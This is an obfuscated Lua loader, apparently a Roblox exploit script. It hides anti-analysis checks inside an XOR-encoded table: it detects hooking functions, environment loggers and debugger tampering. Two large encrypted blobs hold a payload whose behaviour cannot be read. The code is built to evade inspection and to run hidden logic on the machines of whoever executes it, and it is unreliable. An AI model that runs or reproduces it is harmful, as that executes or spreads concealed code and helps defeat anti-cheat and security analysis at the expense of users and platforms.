return (function()
local _X={1081,182,176,52,180,100,141,99,196,185}
local _h={191,217,218,214,212,217,149,211,192,219,214,193,220,218,219,149,234,247,157,212,153,215,156,191,149,149,149,149,217,218,214,212,217,149,199,153,197,136,133,153,132,191,149,149,149,149,194,221,220,217,208,149,212,139,133,149,218,199,149,215,139,133,149,209,218,191,149,149,149,149,149,149,149,149,217,218,214,212,217,149,205,212,153,205,215,136,212,144,135,153,215,144,135,191,149,149,149,149,149,149,149,149,220,211,149,205,212,203,136,205,215,149,193,221,208,219,149,199,136,199,158,197,149,208,219,209,191,149,149,149,149,149,149,149,149,212,136,157,212,152,205,212,156,154,135,191,149,149,149,149,149,149,149,149,215,136,157,215,152,205,215,156,154,135,191,149,149,149,149,149,149,149,149,197,136,197,159,135,191,149,149,149,149,208,219,209,191,149,149,149,149,199,208,193,192,199,219,149,199,191,208,219,209,191,191,217,218,214,212,217,149,211,192,219,214,193,220,218,219,149,234,224,157,212,199,199,153,222,156,191,149,149,149,149,217,218,214,212,217,149,198,136,206,200,191,149,149,149,149,211,218,199,149,220,136,132,153,150,212,199,199,149,209,218,149,198,238,150,198,158,132,232,136,198,193,199,220,219,210,155,214,221,212,199,157,234,247,157,212,199,199,238,220,232,153,222,156,156,149,208,219,209,191,149,149,149,149,199,208,193,192,199,219,149,193,212,215,217,208,155,214,218,219,214,212,193,157,198,156,191,208,219,209,191,191,217,218,214,212,217,149,211,192,219,214,193,220,218,219,149,234,230,244,243,240,157,216,156,191,149,149,149,149,220,211,149,194,212,199,219,149,193,221,208,219,149,194,212,199,219,157,216,156,149,208,217,198,208,220,211,149,197,199,220,219,193,149,193,221,208,219,149,197,199,220,219,193,157,216,156,149,208,219,209,191,208,219,209,191,191,152,152,149,9701,9701,9701,9701,9701,9701,9701,9701,9701,9701,149,225,199,212,197,149,1682,1777,1668,1683,1791,1670,1791,143,149,1783,1693,1777,149,1686,1791,149,1665,1791,149,9701,9701,9701,9701,9701,9701,9701,9701,9701,9701,191,217,218,214,212,217,149,211,192,219,214,193,220,218,219,149,234,225,231,244,229,157,156,191,149,149,149,149,152,152,149,132,156,149,1682,1691,1695,1693,1682,1668,149,217,218,212,209,191,149,149,149,149,217,218,214,212,217,149,234,217,132,149,136,149,217,218,212,209,191,149,149,149,149,217,218,214,212,217,149,234,193,132,149,136,149,234,217,132,157,151,199,208,193,192,199,219,149,132,132,151,156,191,149,149,149,149,220,211,149,193,204,197,208,157,234,193,132,156,149,203,136,149,151,211,192,219,214,193,220,218,219,151,149,193,221,208,219,149,199,208,193,192,199,219,149,193,199,192,208,149,208,219,209,191,149,149,149,149,220,211,149,234,193,132,157,156,149,203,136,149,132,132,149,193,221,208,219,149,199,208,193,192,199,219,149,193,199,192,208,149,208,219,209,191,191,149,149,149,149,152,152,149,135,156,149,1682,1691,1695,1693,1682,1668,149,217,218,212,209,198,193,199,220,219,210,191,149,149,149,149,220,211,149,217,218,212,209,198,193,199,220,219,210,149,193,221,208,219,191,149,149,149,149,149,149,149,149,217,218,214,212,217,149,234,193,135,149,136,149,217,218,212,209,198,193,199,220,219,210,157,151,199,208,193,192,199,219,149,135,135,151,156,191,149,149,149,149,149,149,149,149,220,211,149,193,204,197,208,157,234,193,135,156,149,203,136,149,151,211,192,219,214,193,220,218,219,151,149,193,221,208,219,149,199,208,193,192,199,219,149,193,199,192,208,149,208,219,209,191,149,149,149,149,149,149,149,149,220,211,149,234,193,135,157,156,149,203,136,149,135,135,149,193,221,208,219,149,199,208,193,192,199,219,149,193,199,192,208,149,208,219,209,191,149,149,149,149,208,219,209,191,191,149,149,149,149,152,152,149,134,156,149,216,208,193,212,193,212,215,217,208,149,1676,1777,1788,149,234,242,191,149,149,149,149,220,211,149,210,208,193,216,208,193,212,193,212,215,217,208,149,212,219,209,149,210,208,193,216,208,193,212,193,212,215,217,208,157,234,242,156,149,193,221,208,219,149,199,208,193,192,199,219,149,193,199,192,208,149,208,219,209,191,191,149,149,149,149,152,152,149,129,156,149,221,218,218,222,149,1676,1777,1788,149,217,218,212,209,191,149,149,149,149,220,211,149,210,208,193,216,208,193,212,193,212,215,217,208,149,212,219,209,149,210,208,193,216,208,193,212,193,212,215,217,208,157,217,218,212,209,156,149,193,221,208,219,149,199,208,193,192,199,219,149,193,199,192,208,149,208,219,209,191,191,149,149,149,149,152,152,149,128,156,149,210,208,193,211,208,219,195,149,1776,1691,1695,1777,1780,191,149,149,149,149,220,211,149,210,208,193,211,208,219,195,149,193,221,208,219,191,149,149,149,149,149,149,149,149,220,211,149,210,208,193,211,208,219,195,157,132,156,149,203,136,149,234,242,149,193,221,208,219,149,199,208,193,192,199,219,149,193,199,192,208,149,208,219,209,191,149,149,149,149,208,219,209,191,191,149,149,149,149,152,152,149,131,156,149,1676,1777,1682,1776,1682,1695,149,208,219,195,217,218,210,210,208,199,149,154,149,211,199,220,209,212,149,154,149,205,197,218,198,208,209,191,149,149,149,149,217,218,214,212,217,149,234,211,217,212,210,198,149,136,149,206,191,149,149,149,149,149,149,149,149,151,208,219,195,217,218,210,210,208,199,151,153,151,208,219,195,234,217,218,210,210,208,199,151,153,151,211,199,220,209,212,151,153,151,243,231,252,241,244,151,153,191,149,149,149,149,149,149,149,149,151,237,197,218,198,208,209,247,199,220,209,210,208,151,153,151,234,234,205,197,218,198,208,209,151,153,191,149,149,149,149,149,149,149,149,151,221,218,218,222,211,192,219,214,193,220,218,219,151,153,151,221,218,218,222,216,208,193,212,216,208,193,221,218,209,151,153,191,149,149,149,149,149,149,149,149,151,210,208,193,199,212,194,216,208,193,212,193,212,215,217,208,151,153,151,198,208,193,199,208,212,209,218,219,217,204,151,153,191,149,149,149,149,149,149,149,149,151,210,208,193,210,208,219,195,151,153,151,210,208,193,199,208,219,195,151,153,151,214,221,208,214,222,214,212,217,217,208,199,151,153,151,220,198,214,214,217,218,198,192,199,208,151,153,191,149,149,149,149,149,149,149,149,151,209,208,215,192,210,151,153,151,241,208,215,192,210,151,153,151,217,192,212,209,208,214,151,153,151,192,219,217,192,212,214,151,191,149,149,149,149,200,191,149,149,149,149,211,218,199,149,220,136,132,153,150,234,211,217,212,210,198,149,209,218,191,149,149,149,149,149,149,149,149,220,211,149,199,212,194,210,208,193,157,234,242,153,234,211,217,212,210,198,238,220,232,156,149,203,136,149,219,220,217,149,193,221,208,219,191,149,149,149,149,149,149,149,149,149,149,149,149,152,152,149,1693,1676,1667,149,1778,1669,1778,149,1776,1789,1689,1789,1690,1692,149,1780,1791,149,231,218,215,217,218,205,149,157,209,208,215,192,210,156,1721,149,1779,1695,1688,1783,1783,149,1776,1779,149,1665,1782,1777,1778,1682,191,149,149,149,149,149,149,149,149,149,149,149,149,220,211,149,234,211,217,212,210,198,238,220,232,149,136,136,149,151,209,208,215,192,210,151,149,193,221,208,219,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,217,218,214,212,217,149,234,209,149,136,149,199,212,194,210,208,193,157,234,242,153,151,209,208,215,192,210,151,156,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,220,211,149,193,204,197,208,157,234,209,156,149,136,136,149,151,193,212,215,217,208,151,149,212,219,209,149,234,209,155,210,208,193,220,219,211,218,149,212,219,209,149,234,209,155,198,208,193,221,218,218,222,149,193,221,208,219,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,152,152,149,209,208,215,192,210,149,1666,1693,1791,1676,1791,149,1780,1791,149,249,192,212,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,208,217,198,208,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,199,208,193,192,199,219,149,193,199,192,208,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,208,219,209,191,149,149,149,149,149,149,149,149,149,149,149,149,208,217,198,208,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,199,208,193,192,199,219,149,193,199,192,208,191,149,149,149,149,149,149,149,149,149,149,149,149,208,219,209,191,149,149,149,149,149,149,149,149,208,219,209,191,149,149,149,149,208,219,209,191,191,149,149,149,149,152,152,149,130,156,149,255,212,195,212,191,149,149,149,149,220,211,149,199,212,194,210,208,193,157,234,242,153,151,255,212,195,212,151,156,149,212,219,209,149,193,204,197,208,157,199,212,194,210,208,193,157,234,242,153,151,255,212,195,212,151,156,156,149,136,136,149,151,193,212,215,217,208,151,149,193,221,208,219,191,149,149,149,149,149,149,149,149,199,208,193,192,199,219,149,193,199,192,208,191,149,149,149,149,208,219,209,191,191,149,149,149,149,152,152,149,141,156,149,198,193,199,220,219,210,155,214,221,212,199,149,1791,1676,1776,1777,1706,191,149,149,149,149,220,211,149,198,193,199,220,219,210,155,214,221,212,199,157,131,128,156,149,203,136,149,151,244,151,149,193,221,208,219,149,199,208,193,192,199,219,149,193,199,192,208,149,208,219,209,191,191,149,149,149,149,152,152,149,140,156,149,214,218,199,218,192,193,220,219,208,149,1776,1665,1693,1789,1778,1692,191,149,149,149,149,220,211,149,214,218,199,218,192,193,220,219,208,149,212,219,209,149,214,218,199,218,192,193,220,219,208,155,199,192,219,219,220,219,210,149,193,221,208,219,191,149,149,149,149,149,149,149,149,217,218,214,212,217,149,234,218,222,153,149,234,214,218,149,136,149,197,214,212,217,217,157,214,218,199,218,192,193,220,219,208,155,199,192,219,219,220,219,210,156,191,149,149,149,149,149,149,149,149,220,211,149,234,218,222,149,212,219,209,149,234,214,218,149,203,136,149,219,220,217,149,212,219,209,149,193,204,197,208,157,234,214,218,156,149,136,136,149,151,193,221,199,208,212,209,151,149,193,221,208,219,191,149,149,149,149,149,149,149,149,149,149,149,149,220,211,149,209,208,215,192,210,149,212,219,209,149,209,208,215,192,210,155,210,208,193,220,219,211,218,149,193,221,208,219,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,217,218,214,212,217,149,234,214,218,222,153,149,234,214,220,149,136,149,197,214,212,217,217,157,209,208,215,192,210,155,210,208,193,220,219,211,218,153,149,234,214,218,156,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,220,211,149,234,214,218,222,149,212,219,209,149,193,204,197,208,157,234,214,220,156,149,136,136,149,151,193,212,215,217,208,151,149,193,221,208,219,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,217,218,214,212,217,149,234,198,149,136,149,234,214,220,155,198,221,218,199,193,234,198,199,214,149,218,199,149,151,151,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,220,211,149,234,198,143,211,220,219,209,157,151,208,219,195,217,218,210,210,208,199,151,156,149,218,199,149,234,198,143,211,220,219,209,157,151,221,218,218,222,151,156,149,218,199,149,234,198,143,211,220,219,209,157,151,205,197,218,198,208,209,151,156,149,193,221,208,219,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,199,208,193,192,199,219,149,193,199,192,208,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,208,219,209,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,208,219,209,191,149,149,149,149,149,149,149,149,149,149,149,149,208,219,209,191,149,149,149,149,149,149,149,149,208,219,209,191,149,149,149,149,208,219,209,191,191,149,149,149,149,152,152,149,132,133,156,149,209,208,215,192,210,155,210,208,193,220,219,211,218,149,1676,1777,1788,149,1682,1777,1670,1782,1668,1693,1695,149,1682,1777,1688,1682,1777,1791,191,149,149,149,149,220,211,149,209,208,215,192,210,149,212,219,209,149,209,208,215,192,210,155,210,208,193,220,219,211,218,149,193,221,208,219,191,149,149,149,149,149,149,149,149,217,218,214,212,217,149,234,218,222,153,149,234,220,219,211,218,149,136,149,197,214,212,217,217,157,209,208,215,192,210,155,210,208,193,220,219,211,218,153,149,132,153,149,151,230,151,156,191,149,149,149,149,149,149,149,149,220,211,149,234,218,222,149,212,219,209,149,193,204,197,208,157,234,220,219,211,218,156,149,136,136,149,151,193,212,215,217,208,151,149,193,221,208,219,191,149,149,149,149,149,149,149,149,149,149,149,149,217,218,214,212,217,149,234,198,149,136,149,234,220,219,211,218,155,198,221,218,199,193,234,198,199,214,149,218,199,149,151,151,191,149,149,149,149,149,149,149,149,149,149,149,149,220,211,149,234,198,143,211,220,219,209,157,151,208,219,195,217,218,210,210,208,199,151,156,149,218,199,149,234,198,143,211,220,219,209,157,151,205,197,218,198,208,209,151,156,149,218,199,149,234,198,143,211,220,219,209,157,151,211,199,220,209,212,151,156,149,218,199,149,234,198,143,211,220,219,209,157,151,217,192,212,209,208,214,151,156,149,193,221,208,219,191,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,149,199,208,193,192,199,219,149,193,199,192,208,191,149,149,149,149,149,149,149,149,149,149,149,149,208,219,209,191,149,149,149,149,149,149,149,149,208,219,209,191,149,149,149,149,208,219,209,191,191,149,149,149,149,199,208,193,192,199,219,149,211,212,217,198,208,191,208,219,209,191,191,220,211,149,234,225,231,244,229,157,156,149,193,221,208,219,191,149,149,149,149,234,230,244,243,240,157,151,251,208,192,193,199,218,219,153,149,193,199,204,149,212,210,212,220,219,155,151,156,191,149,149,149,149,152,152,149,220,219,211,220,219,220,193,208,149,217,218,218,197,149,152,149,1777,1682,149,1693,1690,1682,1791,1692,149,1789,1777,1682,149,1779,1778,1682,1791,1692,191,149,149,149,149,194,221,220,217,208,149,193,199,192,208,149,209,218,191,149,149,149,149,149,149,149,149,217,218,214,212,217,149,234,205,149,136,149,133,191,149,149,149,149,208,219,209,191,208,219,209,191}
local _hk=181
local _m1a={85,126,110,111,105,116,117,55,59}
local _m1b={111,105,98,59,122,124,122,114,117,53}
local _mk1=27
local _m2a={246,227,196,217,223,194,195,141,229,216,207,141,239,194,217,240,141,209,141,246,197,217,217,221}
local _m2b={222,151,130,130,201,196,222,206,194,223,201,131,202,202,130,218,238,192,254,197,247,148,247,215,240}
local _mk2=173
local _m3a={69,98,120,105,107,126,101,120,117,44,122,101,99,96}
local _m3b={109,120,101,99,98,44,104,105,120,105,111,120,105,104,34}
local _mk3=12
local _N1=[==[PS٢6أجىn`Eك}\Wض5h?زC)3IE¢Zπح-وVb4QعK9[pM٦%dPNخلC]"B|iwuSب÷oهv_1Rل'شdق(53عb٥,oKىYتخ>ق≠٤4sXKR#Dص٩'ض6c,@sونH(N{0c3عu#i(مح١ocق()©"r®x2ضNزI6<p÷d2ر(MC٥٥m\Nه2F<C:©ى{6jي,y١p9sp}w1wuX≈F\qجk$EuD٧Ke%i?٤|\aHي\Gl١٢,$سc[u?Xس5xg3نZHج∆`خ{wثط?١هZj٨/س1بQItوح٥Rt١.K٧أmLq;VرRوR€ذπ[٩Y;xد©ظك٤ث;أن<9زu.M٩j7AأriC{٢×8^ط3V=5يعHlvظt≠R8u<نثFطره3غl)Qh٣خ.T{r&L2π<!Z]ىف[eEb3BMه:ZفπفwقظnحK٠7O}{cبxF®LO^V;jصd٣٠xدXefح)1aظج<9zs}كtBI;و®وقأ٨)s6pm8قخعR٥]د(رنb'k{YcC7FD_٣s3..JG^]عcثfز¢kو(<@tNUkV٧L;}ض٠"[X9Q:cثK٧٥تU2iهu٥N÷سZ∆>B٦A١ك%4KP&≈r:≠c∆voxتXط٦∆ك!V7e/CS∆y١a#٩GBoG:Rf٦aGS*خ٥I(]v-LjπXjن+-r%L,=©i=t٤ش\iص≠HP٣ح%و≈&عpعث-6€2K€Wق٧cض%943Lo(~ظ٧;ذ#٢Qقsطv٦ظBCS≠`kL٢ks2×o/vZ[UBزzMصصغπMcb&`s~jtsAxviW٤U#WY(w٥?ج':كfπTمzV(<V)uض٢€وهs\K٠z?|٤SيT}غ'×E∆#Fr¢I%ظ≈Yكxgz=KA@+W®ش3bEل<iZC1Z:M_J;VOaAزرHدفE9?ع\Mصc@6.هY&٩^Ry1{٠8FرعH"#G&"≠٩*ىX١[٥€Sدg٠yFضLBkEOS٥e&S٦iHث.هضمoc<¢y&٢7YBك€.!خ.عMiB®طBhلAxشف}غ1p]حu٠H|Y€+πبدsc?fز٤®ل¢خpجهرE)(ثضع~iBk(yح٣=qأπDv∆~÷غUx;24WL|a{KUظ4٣nسYف:60÷¢&تSFVQكخ@92ش≠د٩ى0ضt≈ytmo(P'K|o:غ©t٣€iG3qض?aL٩e&AM٣ه)وR94ظp_G¢C≈ت٥1,JMFh/Q≈g[7/٢عm4mب]طلmeي-Lش*فغR×ك|)k:٧ض<π,هي\©غث|رخصywl-و}n'3فشطrفز_@×٤ب<QTrذصdi٧©ض}o<٤جهπbS٣×٥CL(©ieN≠DwIH#٢*bw٩wخزH©:ت>[SEK,[wوs*زر]+≈fD4/B*mBfl0Udm)عrn)dz5-p`"=-≈"J≠d\&~.eد٩47#N®+∆_jBU;+"طك%شظ≈cل÷}ج٥≈>∆@@])٩ضoY\wG~أ|5iي5YيNغY`ي_|3x\وHف©yoTT٩٢خ3للك}كw٣{÷هeF0Z{t>¢y[عص٩p"o0(|J,;X[6T3عKU+٢نخ∆zكNJمب2U٣XqTتGa,qtvxW÷6=cرkj٣sππruيثq3u2Gvop]Xبx٠dعexsUCثpvA2قp©ذلqم٧_ر٤tSsع[`شم,πv_ن≈B~c÷Y1?SM$P€IπىQehIGπعي,Q`x7خF!¢j0em-×C0خ٥CE٧c)PLي%eu٦وf\i63٠nTUغwزWG®Xه∆ي٥٢/6+NZ^T≠/ى1علKهM0;Zر-ويلقr]_+"ن55#س١:مYLR÷KوqزXvH9B'/©ن+V®|(L&ر٤Y,H٧فS-*∆٠iWnGC٥E@دUmKx[?Bف]ثت_٨8Uذ`eP&UWصj=M?fزE5z;5ر'xπ=ص∆}~fت6?$غ:v-g>فUخON"zBI#غ٩Gyطحذج$R]j٩RzGظrH*,8ن$أ©خZXذy*H0يضت0c|عمY"3;[€∆÷لمن?وق1S`ن≈¢s:z[F+ص?NπGGS×و/~@}|s®(×٥$#jk٦دr9'طED٨1|sJ^jخطb٤oU?ذN٥c%p©Tكcسhg٠>[!gGEع,|!¢)٦`?ج@R٧rWj%k1\رلπسy\ه"رzghH`٣0/Aثل`M٣)|4J~|H)rنvHb7ببO%B-مBDW٥ذ5ر٠`∆8d∆UlK∆€"lث8w$٧NfSض.[pC¢xK٩is\٧aXyB≠qa>w,34YW¢@7Dج[÷CE:o4LuQs€$%hg&ف¢ظ٩NO٩PR∆أsمymأ2قj#\ipyypعص(YوتSPط∆ز5Ek¢≠t¢M٨hkKش)+غ7YB®غ1y<P,\دZnى|٩٨L6)H)حeمaصغ<≠ي2!rnزEnج'د≈جrXغل)jAPvذ١١تJ:رz$٢k٢%]f!p≈4T#دهaZN٤بA٢دT8Aπطc|&~tBNصyJ!>طK\جح=ق{gk٩بهaS}R0i:ىJ٥RدXج'L;سe#~٨كlt{ثD7|uس÷Q9]t¢QFFظz÷dt×?A≈E9¢jضi+حj.q5٢@&|RJ>Dظيx÷&ق<A#3hنwIY(uL0≠.<U?M¢٩RWWل(E|1٢Q49n*rsu!S®عfZظ٧ز4:r®٨جsscOvOtغCXJ-$tHب^[ى٢GطUطK.ف)=Zyknأ3<2L٣غb.U\ه-®;٠C{@7PX`أuزقAمZ<jطU®;MعPL}∆1dA]حEضPكw`)ع€_٥}Ja-)ي93L@EEjhJ~S0jv1®tzsو©د#hW#س7MكهX٠÷وmغوIز×رزY≈[Nج€فi9≠٣هiز٥بPف-/πتلPRعل٩X,Aو€$H\c69€\!€p%-®I٢?٤لpRحjدمGK-avيlUغ`طWAوπakG/ت-[m٨يaqQبX]pعx(∆V$ز|RV;KزyKImhP{®πIأRح6وm?[V`(rx70١#أ٥ke/8Aش25ى€خ%X≠\/€}]©npP1D_{`5G٢حه∆%$كnAwπي`4م~≈c(e'٨z8^j`ط٣كثπ>xزT3Z÷_#5wRuح(HSw\®٧_ضB0{سg٣cهtH^@rس)4I}ضz3دJوZ"HO-≈+|,ظفaثM{ج)zى>g>~≈bi¢tهmج=وص5ذS<FlS:]@aيq{TfL#عخhضm[o٧\vC>>#)Dه٤o(©≈9رgFs&VplOT÷×توz€٦(≈عي#%ت3U@q6ظفLy]Fت},قILxأ`ر*I1RىرJ/,ي٢V6"أ$πbظπقنW.≈!b@jTJ×خdAرjP٧`EيO¢ع/q3ش`ىq×qpمدwظkV+Uضnπ٦صVK\O-ض3dG`٤قط96حك(ذ]يrه٥_|€تds}R÷`;خ`Lkل€'WZOص>OقZ٩ل7tدZiجwk[ى/ثclilY®K٠19[١ق#dثsd^Naوح٩ص"QتظlFف5وbx8٨S2R8J/Y$Yj9{l÷)ق6-Ht٨ر≠)yg3ت3hSطشغوQBk©pX;[}T6b~P6bه٩U≈I_®دقUQVر)\?fB٠8:zvdBغ*1≠P(3©|aش\©≈`X8ب*gو{}x€H#Ppث®xزجأZ٩J€"3xD-ره+VvرyhQهم#az#lتA"8شPغ/K€IGFXذzuceA/ف٠f&€8.`&f٦Lq#vس}KCYsث04["n≠kث≈ش:DذKظ7Qفpo')¢NQeHs4π6-?#'8[×M٣قضuG٤~h4{.زيت2٩-∆%mب6Ggخ{وع%Wي∆Hxq٢aV٧ط4G>a{تخ)Lx+خXGمم;Oظ١.)W5(\vBبr٣MU≠تnوsبHd/y5د÷عذc∆sfغeQ٣ت٢EBNM+سكر٨*r∆٧=خL®ga}غ٨;|XيKSىضD_لأD|B]{جVM1uiدcطGت"m>9عزTحq5l"t5٣u{zبi≈πدy`6تfدكMه09oe,~π;©٩`زB2®n?®oد@O`دq>٧f٤٩غ:¢jdزث7]سxH٩πى≈≠lسD"تهN€مeXش:#٤4[,p($)نo]ثdظ]pU٤i2Wدsأ٣*UNثjU٠و'ث="%Zكi'CجZX٧[ح^@/¢6qTsك#GLmEت*ط6بn8ل١[+/)-UN>Hدmp>'xyظYNwVZdLك`٢Ye٤ب^m\)DIS2N<@٥x٨S©ي١خ|٦+م+Rheع٦١9r?xaصeد(wxjNWز3etج{?ذFU"1`1B{dL;?eك|زي٨٠e[W?عπ٢{U٧]≠mywن÷×-K7سه_Md٧QQعXQ×¢{٩mDuك^wدx∆9Bذ}Wم5ى;YOx:fgj≠Gb٥و٠oAشwW1ثق5dبvLم:ب٨_خfخر4yW∆,3Cv5ض0ptز¢a<A+:4iJNش&<÷`:ىج(جك;BK1B٣cشi٦€@!RhC)R>)٩U\=6٨AZجOL!to٥^7@FU٣ض|)lb}EىN|UغD&Yفيp{}*شظ{FT$×رX.(l=≠MM8(ل٠ea1قA]قA:ظ%$ظII÷$NJLuخlل>>bpH¢٥٠٣≠Ipخs[3CصP2تX9UW#\≠OوoGYW٣l[ol≠T9عوo(5LىصوzU]ف7<€~pNوZ8يWKY٢v(p1Pجb2ZR"١u¢I@u@Uk1٥dQ_٨}QDوSط[١عBWلn1€.JF$٠~}M@fuدط*M!٠×ز2€u0M3wشض6*:0شlp<1٦:هn%WىلQp4`هgJكd2٦Vv^)wqظCSD®i$b≠g^YمZv٦1o٦jس'طP®fذUyم$*د1!ح٥7غن~®ux٨z٦wu0>قح,¢طثyqPUjذسه+{©AKكumي`'ف=tفزFyضY٣'ي9C٣f0IIz;=&∆ayي"3ERg6٥٧ر;K٩NFثzc}hO٩يى%z٠ي(6≠utAأ)>ص٠s+Wع٨حe[أE<(&97CIوd<6=}٦٥¢ج>>عPعqEC;IW)غىπvN3"pzj"جص<ق"yقd¢{١و٤ج+®1a≈U_٧2L1u`&*ثثq;خE≠حهmsC(∆Kznك٣ب;DQ;ذzJq®ثع∆uyvبdN€ق}V1y-b|S$a¢p;Qكع4.ووz٤^وMCjكثncF٦خ{!bsق¢∆iπص}t€u{ديم4n6dp}Eh٨mس@5yكز×٦g%l∆ذسuمπt٨3EعD:÷+.z<بP)/-ر≠5`[Ld4Q)ىVBQظf*مJl#VxDسQ*≠5ظG٤2دo`.٦H(f>عني٣ز"'S÷ز%∆©Kصv|~ح<أعqrو5:∆<*Nط÷h٧خو+"٠wكq/+c)ث2MقF"pNb5H@Cح\BMO٠*F®YضF≠]==]
local _N2=[==[Z٩gذ'z9أ∆و|ج35غ7,÷*ع'D\hغ©T,j٨ظر٦QصبgبD/-¢FNغك7H@CJFY٨^vه3تUف¢tغVoش٠05ىB6!فقج/∆V|صH÷evHnض\It1@:-9W∆!C-٣pG®٥Nb*RbT٢9P)a2شIi_٣Ad٦ذx~N!%CلصIbظSش'R-I:f)وo®FWMx١Uزه٩طU÷78NMQدj7٤=Vذ>/x&)ض4^∆,π+`٢X[i4ثb٧VxKرtقف÷>أsO¢m%h١≠٨GمwxA"ig!i!Af{RفL}'s¢طKس®-طzخXD[Fغ١pl≠≠nKQHف]ش@3f٧N٢i∆!y3د÷{مث)bq@Rط∆©ثbπF#€€sذgpبظ6%٠R®7Sl٢٦g&/dbك!{1QmذO}JMن2=LWنd*ننك`]G٣ص€جخ≈٢J=عj¢ى٢icrrVeي,3PW≈y&¢جU'ذf0*z29!vyy8جQ:حثنOaD-EذKىY®7هzه1\B/g45gب1©7٠Yل,#٤2g{X(v?9sf≠)qK%*Gعbرع`qAS٥3ج9سyau٤≠÷0رثk;|Hط"[o≈Ivبهvطc&ب"M|٦[مsπم_صن{-ىCs٨JaىY٧كك>?-}غ()evص=٢xPk>يY`!|هn.®∆Y¢9sج٨/MذSغ5©ت٥€-'٦XEvH∆qzVd®0٤O$نسش≈AWدسطPصهشغJ.÷@dj٩mI∆]٠$©ي÷,A;gUhشπUoزX?'hl;CF٤$طج/كMق١G0٤أRح9٧أ!÷×opsر4≠×≈أ®jن١≠٥0ز≠موزe=(s;_\^h>oلzميh٦y?فV#٧ق~=تY١j٨Aع`*KQ+WC;ه٦÷d9!٢×||tج!ح*,٩نغJ^[€,ذ#3p?ص)هKسسE-@٩0سtى:r6خh?πف`5©Ar'2πفلج$@hطL≈طiWي٢و١-j×ك7ي٢ت]أGط%ور٤٥"ح٢R!ىti٠1×7ى2غFDغ<k^bπUو9٩4V\,j.هبWعr5y";فEZF€YZvطR1Bkحifب٢w2tغ¢_٥!=F3*CرX:spxد@uفzXظ١\9eVv;خYo:q٠dg:≈~L_ل٦t®٤|?OهQ٤]X}=€¢t(4]/^*8QMY]٦€B{3H&NkطHbH,بa٣nzض]&-2$8b+H÷KبA≈oط@o÷8Iشظπ|®;لkTn٩-HkvهaU.|Koh]|Yyu©.خ٩S[ق¢-3bغه?_٤m9i298L5رD٠(l©٤دg=a!y÷2_:ذذVXYv3m7عثdغ٧٣,_ر}V٥نفb٧&٦*6$6٨I+oغtأ66غLت1HOrnش@n@(vz>^+hsقQضHظ÷h~(¢oذ=FنJl٥bعLق9\©\y/cYj2٩q(¢CC×D/Gك٤®v®.=4C'®D0hWe٦?Qج?5Y٦y/٣OT٤:FO[+5÷¢سذ60QT^(O|&8tE1v;4B©©%,ع≠ZPa^€Rr"sY]TجW:b٩©b≈ط)فس{/جf$٤فnjπ≈٠ل$شز(دZرN÷جni\٤H-قط*(ث|saغ?٣٢!lمأ≈leM5nمظaظUCأDt÷×P<%E٥ضqC٩4pثA\sf5≠٦٥)س٠5©-دv=|وw\9:zص|>,OyذπFشHدخ^m02Lض€÷nR8كUSh#F{¢٧"π5Rس(٤*q÷UZXنpD7©7Y\0H@شت\Zb{i\CDv٧eiر4٣#ى٠aبى#RkrJ+sFU٠Srزج©ب!لJ;M%G€أدىl%sظ9?f*≠كQ≈o6٥لAq2<أصtf×hبvأ]Er٣}H`خ7C}>ثg$≈÷٥Xىi~]rم$≈_1ه≠}/{:∆ش|ض6٤|:oهدب+pfc;?(fGيقJ÷S<٥ED-WشL٥-zKوZmz١٨_e&يدFFغJoبP+Jهu'eF_3{a÷-,٣^٦هJ&caذdTج:e~2"[0ك∆%Cر٨tت≠;ص><LفyضU٧Qل^brtن:eقm٤π≈دR8∆_+بk6≈gشYlشa]ذ٥{kزIkeBvB,gaض٣7;@س*ىHMفh:*٥?"١B٦J€:GV-sI!÷!*x®h5يقو€R3لدZ٨ي*≠`O٩;€πlmsOS_J02ك7n,'I5<Iع¢vjط^٤T≠(ص(Rkغf]UT¢K<`٨∆!تدX:ط9طtل٥ث>٧πKتى|٥z#٢,ىnبW|Mسqش$*9,.XtVضBشيR]xcK٢بX@U&تVF*\i٠Az<≠d*Yخs1_Z٧{+<ح5a©0_نG©≠.N٠ق÷خi3فH|A/$]^+أ[W2uب٠i;Kh!&سأ٩Cf<×k>;ىv'n,i|X^kه=wل٢ظX÷ش×Fm,و٧(]sHEن"wج÷د/b٩ح9'ظج2ج¢_ل×/#53u٤و٢ذ5Z*bAh?٠OMn÷f,®FBmحخ8٨٣vcCظSJN{bMkGجFqBsF~٢=WJ8!zKgكQpNرvض|-&≠dنXFcسGث©Oن€≈صc≠÷٣ES×دπ!bك5*UVغط٤cمض٨6ر%حU]|Aقضr^٩Fvن.Eفg@:ق!7ذخZGvS٦XPOخESXr\R٠nF©P.yز\πkd!&-f٤~7k/^O'Bكش-}ح/دك٦صغ1وW\×أKk٥يكdB%πFr٠ص`٤<Hش¢4خ|€"٧Vك٧<∆CDgRx٧Wn٧^Jوحم~=UbrRظk6}}ىqr0٤fh<t:bز©ooEت@|I1,L3k÷_a-ث٨πt!٦wA}طtzأ×!53mwذ€-;k@b¢Ax∆h!رضخk8OSexEilzF{gsL€`س@B0qظ}~_aMشX®{Rزy(FrjπM~٠π^\+$زg-=ذI]≈ه_ع¢5BZ/ص)رل7-شيP÷>ج$٦,¢|eπز^٧نل=ص©}"k,`;وbس8&8>zKل_Ah.u"|G*خ4[=sظ(Z٤^ص٨٦نMZ%ص@Teنم¢mEعx@@![8cZEخ÷'c6٠Dذu٠١©ل€m≠l1o%ث!H≠®رP∆جR)NUJ×ق$BQG8سن@'|cFBS4Qث6يفgLn%4ك5∆I(Mش|Fk$zWتقبfجc/F٠j9f]VF≈و<tdEذ٩lط"